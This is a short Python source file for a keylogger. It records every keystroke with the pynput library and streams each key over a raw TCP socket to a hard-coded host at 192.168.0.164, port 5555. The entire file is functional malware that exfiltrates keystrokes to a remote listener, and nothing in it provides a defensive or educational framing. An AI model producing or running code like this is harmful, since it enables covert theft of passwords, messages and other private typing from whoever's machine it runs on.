from pynput.keyboard import Listener, Key
import socket, time

def on_press(key):
    if hasattr(key, 'char'):  # Write the character pressed if available
        server.send(key.char.encode())
    elif key == Key.space:  # If space was pressed, server.send a space
        server.send(' '.encode())
    elif key == Key.enter:  # If enter was pressed, server.send a new line
        server.send('\n'.encode())
    elif key == Key.tab:  # If tab was pressed, server.send a tab
        server.send('\t'.encode())
    else:  # If anything else was pressed, server.send [<key_name>]
        server.send(('[' + key.name + ']').encode())

if __name__ == "__main__":
    HOST = '192.168.0.164'
    PORT = 5555
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((HOST, PORT))
    while(True):
        time.sleep(10)
        with Listener(on_press=on_press) as listener:
            listener.join()

    server.close()